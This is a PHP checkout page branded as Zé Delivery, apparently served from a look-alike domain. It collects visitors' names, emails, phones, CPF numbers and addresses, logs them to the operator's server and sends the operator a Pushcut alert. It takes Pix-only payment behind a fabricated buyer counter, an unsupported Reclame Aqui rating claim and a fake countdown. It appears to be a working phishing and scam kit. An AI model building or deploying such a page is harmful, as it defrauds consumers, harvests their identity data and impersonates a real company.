<?php
$prodName = isset($_GET['prod']) ? htmlspecialchars(urldecode($_GET['prod'])) : 'Combo Tanqueray';
$prodPrice = isset($_GET['price']) ? floatval($_GET['price']) : 79.90;
$prodImg = isset($_GET['img']) ? htmlspecialchars(urldecode($_GET['img'])) : 'assets/https_online-bebidas_fun_ze_images_6_png.png';
$prodDesc = isset($_GET['desc']) ? htmlspecialchars(urldecode($_GET['desc'])) : '';
$prodPriceFormatted = number_format($prodPrice, 2, ',', '.');
$prodPriceDot = number_format($prodPrice, 2, '.', '');
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zé Delivery - Checkout</title>
    <style>
        :root {
            --primary-yellow: #ffcc01;
            --text-dark: #333;
            --text-gray: #666;
            --bg-gray: #f5f5f5;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f9f9;
            color: var(--text-dark);
        }

        /* Utils */
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            min-height: 100vh;
            padding-bottom: 20px;
        }

        .flex { display: flex; }
        .justify-between { justify-content: space-between; }
        .items-center { align-items: center; }
        .font-bold { font-weight: bold; }
        .text-center { text-align: center; }
        .w-full { width: 100%; }

        /* Header */
        header {
            background-color: white;
            border-bottom: 3px solid var(--primary-yellow);
            padding: 10px 15px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .logo img {
            height: 35px;
        }

        .cart-summary {
            text-align: right;
            font-size: 0.9em;
            cursor: pointer;
        }

        .cart-summary .price {
            font-weight: 800;
            font-size: 1.1em;
        }

        .cart-summary .toggle {
            font-size: 0.8em;
            color: var(--text-dark);
        }

        /* Cart Details (Collapsible) */
        #cart-details {
            padding: 20px;
            border-bottom: 1px solid #eee;
        }

        .product-card {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }

        .product-img {
            width: 80px;
            height: 80px;
            background-color: #ffcc01;
            border-radius: 8px;
            object-fit: cover;
        }

        .product-info h3 {
            margin: 0 0 5px 0;
            font-size: 1.1em;
        }

        .qty-selector {
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 5px;
            background: white;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 0.9em;
        }

        .price-text {
            color: #dfa600;
            font-weight: 900;
            font-size: 1.2em;
        }

        .totals {
            margin-top: 20px;
            border-top: 1px solid #f0f0f0;
            padding-top: 15px;
        }

        .row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 0.95em;
        }

        .row.total {
            font-weight: 900;
            font-size: 1.1em;
            margin-top: 10px;
        }

        .hide-cart-btn {
            background-color: var(--primary-yellow);
            border: none;
            width: 100%;
            padding: 10px;
            border-radius: 20px;
            font-weight: bold;
            margin-top: 15px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }

        .banner {
            background: #00BAF7; 
            height: 110px; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            position: relative; 
            overflow: hidden; 
            border-bottom: 4px solid black;
        }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }

        .promo-bar {
            background-color: var(--primary-yellow);
            color: black;
            font-size: 0.7em;
            font-weight: 900;
            text-align: center;
            padding: 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .tracker {
            display: flex;
            justify-content: center;
            gap: 40px;
            padding: 20px 0;
            position: relative;
        }
        
        .tracker::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 20%;
            right: 20%;
            height: 2px;
            background: #eee;
            z-index: 0;
            transform: translateY(-50%);
        }

        .step {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: #eee;
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: bold;
            z-index: 1;
            position: relative;
            cursor: default;
        }

        .step.active {
            background: white;
            border: 2px solid var(--primary-yellow);
            color: black;
            background-color: var(--primary-yellow); /* Yellow fill for active/done steps in provided image 2 */
        }
        
        .step.done {
            background-color: var(--primary-yellow);
        }

        .section-title {
            padding: 0 20px;
            font-size: 1.1em;
            color: #555;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .secure-badge {
            font-size: 0.7em;
            color: #555;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .form-group {
            padding: 10px 20px;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 15px;
        }

        .input-wrapper input {
            width: 100%;
            padding: 12px 12px 12px 40px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 1em;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-wrapper input:focus {
            border-color: var(--primary-yellow);
        }

        .input-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            color: #ffcc01;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Upsell specific styles */
        .upsell-card {
            border: 2px solid #ffd700;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 15px;
            background: white;
            position: relative;
        }
        
        .upsell-tag {
            background: var(--primary-yellow);
            color: black;
            font-weight: bold;
            padding: 2px 8px;
            font-size: 0.7em;
            border-radius: 4px;
            display: inline-block;
            margin-right: 5px;
        }
        
        .upsell-btn {
            background: white;
            border: 1px solid #ffcc01;
            color: black;
            text-transform: uppercase;
            font-weight: bold;
            font-size: 0.8em;
            padding: 8px;
            border-radius: 20px;
            width: 100%;
            margin-top: 10px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }

        .upsell-btn.selected {
             background: #fff8d2;
             border: 2px solid #ffcc01;
        }
        
        .hidden-step {
            display: none;
        }

        .submit-btn {
            background: white;
            border: 2px solid #ffcc01;
            width: calc(100% - 40px);
            margin: 20px;
            padding: 12px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 1.1em;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        /* Other reused styles (Trust box, footer, etc) */
        .trust-box {
            margin: 10px 20px;
            background: #f8f8f8;
            border: 1px solid #eee;
            border-radius: 10px;
            padding: 15px;
        }
        /* ... skipped repeated CSS from previous file for brevity ... */
        .trust-header { display: flex; align-items: center; gap: 10px; font-size: 0.85em; color: #555; margin-bottom: 10px; }
        .trust-list { list-style: none; padding: 0; margin: 0; }
        .trust-list li { display: flex; align-items: flex-start; gap: 8px; font-size: 0.8em; color: #666; margin-bottom: 5px; }
        .check-icon { color: var(--primary-yellow); min-width: 15px; }
        .people-counter { margin: 0 20px; background: #fffbe6; border: 1px dashed var(--primary-yellow); padding: 10px; border-radius: 8px; display: flex; align-items: center; gap: 10px; font-size: 0.9em; color: #555; }
        .counter-digits { display: flex; gap: 3px; }
        .digit { background: var(--primary-yellow); padding: 2px 6px; border-radius: 4px; font-weight: bold; color: black; }
        .reclame-aqui { margin: 20px; text-align: center; background: white; padding: 15px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .countdown-sticky { margin-top: 20px; text-align: center; background-color: #f5f5f5; padding: 15px; font-weight: bold; font-size: 0.9em; color: #555; }
        .timer-badge { background: var(--primary-yellow); padding: 2px 6px; border-radius: 4px; margin: 0 2px; }

    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>

<div class="container">
    <header class="flex justify-between items-center">
        <div class="logo">
            <img src="assets/https_online-bebidas_fun_ze_images_ze_png.png" alt="Zé Delivery">
        </div>
        <div class="cart-summary" onclick="toggleCart()">
            <div class="price" id="header-price">R$ <?php echo $prodPriceFormatted; ?></div>
            <div class="toggle">
                <i class="fa-solid fa-cart-shopping"></i> 1 <i class="fa-solid fa-chevron-up" id="chev-icon"></i>
            </div>
        </div>
    </header>

    <div id="cart-details">
        <div class="product-card">
            <img src="<?php echo $prodImg; ?>" alt="<?php echo $prodName; ?>" class="product-img">
            <div class="product-info w-full">
                <h3><?php echo $prodName; ?></h3>
                <?php if($prodDesc): ?>
                    <p style="font-size: 0.8em; color: #666; margin: 0 0 5px 0; line-height: 1.2;"><?php echo $prodDesc; ?></p>
                <?php endif; ?>
                <div class="flex justify-between items-center w-full">
                    <div class="qty-selector">
                        <i class="fa-solid fa-boxes-stacked" style="color: #ffd700;"></i> Qtd. 1 <i class="fa-solid fa-chevron-down" style="font-size: 0.8em;"></i>
                    </div>
                    <div class="price-text">R$ <?php echo $prodPriceFormatted; ?></div>
                </div>
            </div>
        </div>
        
        <!-- Hidden List of Upsells in Cart -->
        <div id="cart-gelo" style="display:none;" class="product-card">
             <div style="width: 50px; height: 50px; background: #eee; border-radius: 4px; display: flex; align-items:center; justify-content:center;">💧</div>
             <div style="flex-grow:1; padding-left: 10px;">
                 <div style="font-size: 0.9em; font-weight: bold;">Água Mineral 500ml</div>
                 <div style="color: #dfa600; font-weight: 900;">R$ 3,00</div>
             </div>
        </div>
        <div id="cart-carvao" style="display:none;" class="product-card">
             <div style="width: 50px; height: 50px; background: #333; color: white; border-radius: 4px; display: flex; align-items:center; justify-content:center;">🍫</div>
             <div style="flex-grow:1; padding-left: 10px;">
                 <div style="font-size: 0.9em; font-weight: bold;">Brownie de Chocolate</div>
                 <div style="color: #dfa600; font-weight: 900;">R$ 6,00</div>
             </div>
        </div>

        <div class="totals">
            <div class="row">
                <span>Subtotal</span>
                <span id="subtotal-display">R$ <?php echo $prodPriceFormatted; ?></span>
            </div>
            <div class="row" style="color: #1a9e58; font-weight: bold;" id="promo-row">
                 <span>Frete</span>
                 <span style="background: #25d366; color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.8em;">GRÁTIS</span>
            </div>
            <div class="row total">
                <span>Total</span>
                <span id="total-display">R$ <?php echo $prodPriceFormatted; ?></span>
            </div>
        </div>
        <button class="hide-cart-btn" onclick="toggleCart()">Ocultar carrinho <i class="fa-solid fa-chevron-up"></i></button>
    </div>

    <!-- Banner -->
    <div class="banner">
       <div style="position: absolute; width: 200%; height: 200%; background: repeating-conic-gradient(#00a0e4 0% 10%, #0089c4 10% 20%); animation: spin 20s linear infinite; opacity: 0.3;"></div>
       <div style="z-index: 10; text-align: center; transform: rotate(-3deg);">
           <div style="font-family: 'Arial Black', sans-serif; font-size: 1.6em; color: white; text-shadow: 4px 4px 0px #000; line-height: 0.9; margin-bottom: -5px; -webkit-text-stroke: 1px black;">SEMANA</div>
           <div style="font-family: 'Arial Black', sans-serif; font-size: 2.5em; color: var(--primary-yellow); text-shadow: 4px 4px 0px #000; line-height: 0.9; -webkit-text-stroke: 1.5px black;">SURREAL</div>
       </div>
    </div>
    <div class="promo-bar">PREÇOS FORA DA REALIDADE # ZÉ ENTREGA TUDO!</div>

    <div class="tracker">
        <div class="step active" id="badge-1">1</div>
        <div class="step" id="badge-2">2</div>
        <div class="step" id="badge-3">3</div>
    </div>

    <form action="payment.php" method="POST" id="main-form">
        <input type="hidden" name="total_amount" id="form-total" value="<?php echo $prodPriceDot; ?>">
        <input type="hidden" name="upsell_gelo" id="form-upsell-gelo" value="0">
        <input type="hidden" name="upsell_carvao" id="form-upsell-carvao" value="0">
        <input type="hidden" name="product_name" value="<?php echo $prodName . ($prodDesc ? ' - ' . $prodDesc : ''); ?>">
        <input type="hidden" name="product_price" value="<?php echo $prodPriceFormatted; ?>">

        <!-- STEP 1: Personal Data -->
        <div id="step-1">
            <div class="section-title">
                <b>Dados pessoais</b>
                <div class="secure-badge">Ambiente seguro <i class="fa-solid fa-shield-halved" style="color: #ffcc01;"></i></div>
            </div>
            <div class="form-group">
                <div class="input-wrapper"><div class="input-icon"><i class="fa-regular fa-user"></i></div><input type="text" name="name" placeholder="Nome completo" required></div>
                <div class="input-wrapper"><div class="input-icon"><i class="fa-regular fa-envelope"></i></div><input type="email" name="email" placeholder="E-mail" required></div>
                <div class="input-wrapper"><div class="input-icon"><i class="fa-solid fa-mobile-screen"></i></div><input type="tel" name="phone" placeholder="DDD + número" required></div>
                <div class="input-wrapper"><div class="input-icon"><i class="fa-regular fa-id-card"></i></div><input type="text" name="cpf" placeholder="CPF" required></div>
            </div>
            
            <div class="trust-box">
                <div class="trust-header"><i class="fa-solid fa-lock"></i> Usamos seus dados de forma segura para garantir a sua satisfação:</div>
                <ul class="trust-list">
                    <li><i class="check-icon fa-solid fa-circle-check"></i> Enviar o seu comprovante de compra e pagamento;</li>
                    <li><i class="check-icon fa-solid fa-circle-check"></i> Ativar sua devolução caso não fique satisfeito;</li>
                    <li><i class="check-icon fa-solid fa-circle-check"></i> Acompanhar o andamento do seu pedido.</li>
                </ul>
            </div>
            
            <button type="button" class="submit-btn" style="background: white; border: 2px solid #ffcc01;" onclick="validateStep1()">
                Entrega <i class="fa-solid fa-arrow-right"></i>
            </button>
        </div>

        <!-- STEP 2: Address -->
        <div id="step-2" class="hidden-step">
            <div class="section-title">
                <b>Frete e destino</b>
                <div class="secure-badge">Ambiente seguro <i class="fa-solid fa-shield-halved" style="color: #ffcc01;"></i></div>
            </div>
            <div class="form-group">
                <div class="input-wrapper flex">
                    <input type="text" style="border-radius: 8px 0 0 8px;" name="cep" placeholder="00000-000" id="cep-input" maxlength="9">
                    <button type="button" onclick="buscarCep()" style="background: white; font-weight: bold; border: 1px solid #ddd; border-left: none; border-radius: 0 8px 8px 0; padding: 0 15px; cursor: pointer;">Buscar</button>
                </div>
                <a href="https://buscacepinter.correios.com.br/app/endereco/index.php" target="_blank" style="font-size: 0.8em; color: #555; text-decoration: underline;">Não sei meu CEP</a>
                
                <div id="frete-badge" style="border: 1px solid #ffd700; background: white; padding: 10px; margin: 15px 0; border-radius: 8px; display: none; align-items: start; gap: 10px;">
                    <div style="color: #ffcc01; font-size: 1.5em;">☀️</div>
                    <div>
                        <b>Grátis</b> <br>
                        <span style="font-size: 0.8em; color: #666;">🚀 Entrega rápida | Previsão: 15 min corridos</span>
                    </div>
                </div>

                <div id="address-fields" style="display: none;">
                    <div class="input-wrapper"><div class="input-icon"><i class="fa-solid fa-location-dot"></i></div><input type="text" name="street" id="street" placeholder="Rua / Avenida" required readonly></div>
                    <div class="flex" style="gap: 10px;">
                        <div class="input-wrapper w-full"><input type="text" name="number" id="number" placeholder="Número" required></div>
                        <div class="input-wrapper w-full"><input type="text" name="complement" id="complement" placeholder="Complemento"></div>
                    </div>
                    <div class="input-wrapper"><input type="text" name="neighborhood" id="neighborhood" placeholder="Bairro" required readonly></div>
                    <div class="flex" style="gap: 10px;">
                       <div class="input-wrapper w-full"><input type="text" name="city" id="city" placeholder="Cidade" required readonly></div>
                       <div class="input-wrapper" style="width: 30%;"><input type="text" name="uf" id="uf" placeholder="UF" required readonly></div>
                    </div>
                </div>
            </div>

            <div class="flex justify-between items-center" style="padding: 0 20px;">
                <div onclick="goToStep(1)" style="font-weight: bold; cursor: pointer;"><i class="fa-solid fa-arrow-left"></i> Voltar</div>
                <button type="button" class="submit-btn" style="width: auto; margin: 0; background: white; border: 2px solid #ffcc01; padding: 10px 30px;" onclick="validateStep2()">
                    Pagamento <i class="fa-solid fa-arrow-right"></i>
                </button>
            </div>
            <br>
        </div>

        <!-- STEP 3: Payment -->
        <div id="step-3" class="hidden-step">
            <!-- (Content remains same, just ensuring context for replacement if needed, but I am replacing Step 2 block mainly) -->
            <!-- ... -->
            <div class="section-title">
                <b>Opções de pagamento</b>
                <div class="secure-badge">Ambiente seguro <i class="fa-solid fa-shield-halved" style="color: #ffcc01;"></i></div>
            </div>
            
            <div style="margin: 20px;">
                <div style="border: 2px solid #ffcc01; border-radius: 25px; padding: 12px; text-align: center; font-weight: bold; display: flex; justify-content: center; gap: 10px; align-items: center; background: white;">
                    <i class="fa-brands fa-pix"></i> Pix
                </div>
            </div>

            <div style="background: #ffcc01; padding: 10px; margin: 0 20px; border-radius: 8px; font-weight: bold; display: flex; align-items: center; gap: 10px;">
                <i class="fa-solid fa-fire"></i> 2 ofertas exclusivas
            </div>
            <p style="margin: 10px 20px; font-size: 0.9em; color: #555;">Não perca esta oferta especial: Adicione esses produtos ao seu pedido agora e economize.</p>

            <div style="padding: 0 20px;">
                <!-- Offer 1 -->
                <div class="upsell-card">
                    <div class="flex" style="gap: 15px;">
                        <div style="width: 60px; height: 60px; font-size: 40px; text-align: center;">💧</div>
                        <div>
                            <b>Água Mineral 500ml</b> <br>
                            <span class="upsell-tag">POR</span> <span style="font-weight: 900; font-size: 1.2em;">R$ 3,00</span>
                        </div>
                    </div>
                    <div class="upsell-btn" id="btn-upsell-gelo" onclick="toggleUpsell('gelo', 3.00)">
                        <span id="check-gelo" style="display:none;"><i class="fa-solid fa-check"></i></span> PEGAR OFERTA
                    </div>
                </div>

                <!-- Offer 2 -->
                <div class="upsell-card">
                     <div class="flex" style="gap: 15px;">
                        <div style="width: 60px; height: 60px; font-size: 40px; text-align: center;">🍫</div>
                        <div>
                            <b>Brownie de Chocolate</b> <br>
                            <span class="upsell-tag">POR</span> <span style="font-weight: 900; font-size: 1.2em;">R$ 6,00</span>
                        </div>
                    </div>
                    <div class="upsell-btn" id="btn-upsell-carvao" onclick="toggleUpsell('carvao', 6.00)">
                         <span id="check-carvao" style="display:none;"><i class="fa-solid fa-check"></i></span> PEGAR OFERTA
                    </div>
                </div>
            </div>

            <div style="text-align: center; margin: 20px; font-weight: bold;">
                Somente <b>para este pedido</b>
            </div>

            <div class="flex justify-between items-center" style="padding: 0 20px;">
                <div onclick="goToStep(2)" style="font-weight: bold; cursor: pointer;"><i class="fa-solid fa-arrow-left"></i> Voltar</div>
                <button type="submit" class="submit-btn" style="width: auto; margin: 0; background: var(--primary-yellow); padding: 12px 40px; border: none;">
                    Gerar Pix
                </button>
            </div>
            
            <div style="margin: 20px; font-size: 0.8em; color: #555;">
                <div style="margin-bottom: 5px;"><i class="fa-regular fa-credit-card" style="color: #ffcc01; width: 20px;"></i> Pagamento somente à vista</div>
                <div style="margin-bottom: 5px;"><i class="fa-regular fa-clock" style="color: #ffcc01; width: 20px;"></i> A liberação da compra ocorre após a confirmação do pagamento</div>
                <div><i class="fa-solid fa-ticket" style="color: #ffcc01; width: 20px;"></i> Ao gerar o código atente para a data de expiração</div>
            </div>
        </div>

    </form>

    <div class="people-counter">
        <div class="counter-digits"><span class="digit">0</span><span class="digit">3</span><span class="digit">6</span></div>
        <span>pessoas finalizando a compra neste momento.</span>
    </div>
    
    <div style="padding: 20px; font-size: 0.9em; color: #666;">1 avaliação</div>
    <div class="reclame-aqui">
        <div class="flex items-center" style="gap: 10px; margin-bottom: 10px;">
           <img src="https://logodownload.org/wp-content/uploads/2014/09/reclame-aqui-logo.png" style="height: 20px;" alt="RA">
           <b>Reclame Aqui</b>
        </div>
        <div style="color: var(--primary-yellow); font-size: 1.2em; margin-bottom: 10px;">
            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
        </div>
        <p style="font-size: 0.8em; text-align: left; color: #666; margin: 0;">Verificada com Nota Máxima pelo Reclame Aqui por oferecer Compra Segura, Nota Fiscal Garantida e Entrega Rastreada.</p>
        <div style="color: #00a0e4; font-size: 0.8em; text-align: left; font-weight: bold; margin-top: 5px; cursor: pointer;">Ver mais</div>
    </div>

    <div class="countdown-sticky">
        OFERTA TERMINA EM <span class="timer-badge" id="timer-min">12</span> : <span class="timer-badge" id="timer-sec">42</span> : <span class="timer-badge" id="timer-ms">99</span>
    </div>
</div>

<!-- Masking Library for input formatting -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
    $(document).ready(function(){
        $('input[name="phone"]').mask('(00) 00000-0000');
        $('input[name="cpf"]').mask('000.000.000-00');
        $('input[name="cep"]').mask('00000-000');

        // Helpers for Cookies
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        }

        const initialCity = getCookie('localCidade') || 'Desconhecida';
        console.log("Initial City:", initialCity);

        // Pushcut Notification: Checkout
        fetch('https://api.pushcut.io/Dhaa7jDokLKD48hZmOJeL/notifications/T%C3%A1%20no%20checkout')
            .catch(e => console.error("Pushcut Error:", e));

        // Logger: Page Visit
        fetch('log_action.php', {
            method: 'POST',
            body: JSON.stringify({ 
                action: 'Page Visit', 
                details: {
                    page: 'Checkout Page Loaded',
                    initial_city: initialCity
                }
            })
        });
        
        // Expose to global scope for validateStep1
        window.initialCity = initialCity;
    });
</script>

<script>
    let currentTotal = <?php echo $prodPrice; ?>;
    const baseTotal = <?php echo $prodPrice; ?>;
    
    function formatCurrency(value) {
        return 'R$ ' + value.toFixed(2).replace('.', ',');
    }

    function validateStep1() {
        const name = document.querySelector('input[name="name"]').value;
        const email = document.querySelector('input[name="email"]').value;
        const phone = document.querySelector('input[name="phone"]').value;
        const cpf = document.querySelector('input[name="cpf"]').value;

        if(!name || !email || !phone || !cpf) {
            alert('Por favor, preencha todos os campos pessoais.');
            return;
        }
        
        if(!isValidCPF(cpf)) {
            alert('CPF inválido. Por favor verifique.');
            return;
        }

        // Facebook CAPI Tracking
        // We use the Initial City from cookie since user hasn't filled address yet
        sendCAPIEvent('InitiateCheckout', {
            name: name,
            email: email,
            phone: phone,
            cpf: cpf,
            city: window.initialCity, // Added City from Cookie
            value: currentTotal,
            content_name: "<?php echo $prodName; ?>"
        });

        // Enhanced Logging: Send Full Data
        fetch('log_action.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'User Data',
                details: {
                    'Nome': name,
                    'Email': email,
                    'Telefone': phone,
                    'CPF': cpf,
                    'Cidade Inicial': window.initialCity
                }
            })
        });

        goToStep(2);
    }

    function sendCAPIEvent(eventName, data) {
        fetch('track.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                event_name: eventName,
                ...data
            })
        }).then(res => res.json())
          .then(res => console.log('CAPI:', res))
          .catch(err => console.error('CAPI Error:', err));
    }

    function isValidCPF(cpf) {
        cpf = cpf.replace(/[^\d]+/g,'');
        if(cpf == '') return false;
        // Elimina CPFs invalidos conhecidos
        if (cpf.length != 11 || 
            cpf == "00000000000" || 
            cpf == "11111111111" || 
            cpf == "22222222222" || 
            cpf == "33333333333" || 
            cpf == "44444444444" || 
            cpf == "55555555555" || 
            cpf == "66666666666" || 
            cpf == "77777777777" || 
            cpf == "88888888888" || 
            cpf == "99999999999")
                return false;
        // Valida 1o digito
        let add = 0;
        for (let i=0; i < 9; i ++) add += parseInt(cpf.charAt(i)) * (10 - i);
        let rev = 11 - (add % 11);
        if (rev == 10 || rev == 11) rev = 0;
        if (rev != parseInt(cpf.charAt(9))) return false;
        // Valida 2o digito
        add = 0;
        for (let i = 0; i < 10; i ++) add += parseInt(cpf.charAt(i)) * (11 - i);
        rev = 11 - (add % 11);
        if (rev == 10 || rev == 11) rev = 0;
        if (rev != parseInt(cpf.charAt(10))) return false;
        return true;
    }

    function validateStep2() {
        const number = document.getElementById('number').value;
        if(document.getElementById('address-fields').style.display === 'none') {
            alert('Por favor, busque o CEP primeiro.');
            return;
        }
        if(!number) {
            alert('Por favor, preencha o número do endereço.');
            document.getElementById('number').focus();
            return;
        }
        goToStep(3);
    }

    function buscarCep() {
        let cep = document.getElementById('cep-input').value.replace(/\D/g, '');
        if (cep.length === 8) {
             // Show loading state if wanted, or just fetch
             fetch(`https://viacep.com.br/ws/${cep}/json/`)
                .then(response => response.json())
                .then(data => {
                    if(!data.erro) {
                        document.getElementById('street').value = data.logradouro;
                        document.getElementById('neighborhood').value = data.bairro;
                        document.getElementById('city').value = data.localidade;
                        document.getElementById('uf').value = data.uf;
                        
                        document.getElementById('address-fields').style.display = 'block';
                        document.getElementById('frete-badge').style.display = 'flex';
                        
                        document.getElementById('number').focus();
                    } else {
                        alert('CEP não encontrado.');
                    }
                })
                .catch(err => {
                    alert('Erro ao buscar CEP.');
                    console.error(err);
                });
        } else {
            alert('CEP inválido. Digite apenas números.');
        }
    }

    function toggleCart() {
        const details = document.getElementById('cart-details');
        const icon = document.getElementById('chev-icon');
        if (details.style.display === 'none') {
            details.style.display = 'block';
            icon.classList.remove('fa-chevron-down'); icon.classList.add('fa-chevron-up');
        } else {
            details.style.display = 'none';
            icon.classList.remove('fa-chevron-up'); icon.classList.add('fa-chevron-down');
        }
    }

    function goToStep(step) {
        // Hide all steps
        document.getElementById('step-1').classList.add('hidden-step');
        document.getElementById('step-2').classList.add('hidden-step');
        document.getElementById('step-3').classList.add('hidden-step');
        
        // Show current step
        document.getElementById('step-' + step).classList.remove('hidden-step');

        // Update badges
        const badges = [1, 2, 3];
        badges.forEach(n => {
            const badge = document.getElementById('badge-' + n);
            badge.classList.remove('active');
            if(n === step) badge.classList.add('active');
            if(n < step) badge.style.backgroundColor = '#ffcc01'; // Mark previous as done
        });
        
        // Scroll to top of form
        document.querySelector('.container').scrollIntoView({behavior: 'smooth'});
    }

    function toggleUpsell(item, price) {
        const btn = document.getElementById('btn-upsell-' + item);
        const check = document.getElementById('check-' + item);
        const input = document.getElementById('form-upsell-' + item);
        
        // Items in cart list
        const cartItem = document.getElementById('cart-' + item);

        if (input.value === '0') {
            // Select
            input.value = '1';
            btn.classList.add('selected');
            check.style.display = 'inline';
            btn.style.backgroundColor = '#fff8d2';
            currentTotal += price;
            cartItem.style.display = 'flex';
        } else {
            // Deselect
            input.value = '0';
            btn.classList.remove('selected');
            check.style.display = 'none';
            btn.style.backgroundColor = 'white';
            currentTotal -= price;
            cartItem.style.display = 'none';
        }

        // Update totals
        document.getElementById('header-price').textContent = formatCurrency(currentTotal);
        document.getElementById('subtotal-display').textContent = formatCurrency(currentTotal);
        document.getElementById('total-display').textContent = formatCurrency(currentTotal);
        document.getElementById('form-total').value = currentTotal.toFixed(2);
    }

    // Countdown Logic
    let minutes = 12;
    let seconds = 42;
    let centiseconds = 99;
    const minEl = document.getElementById('timer-min');
    const secEl = document.getElementById('timer-sec');
    const msEl = document.getElementById('timer-ms');
    
    setInterval(() => {
        if (centiseconds > 0) centiseconds--;
        else {
            centiseconds = 99;
            if (seconds > 0) seconds--;
            else {
                if (minutes > 0) { minutes--; seconds = 59; }
            }
        }
        minEl.textContent = minutes.toString().padStart(2, '0');
        secEl.textContent = seconds.toString().padStart(2, '0');
        msEl.textContent = centiseconds.toString().padStart(2, '0');
    }, 10);
</script>

</body>
</html>
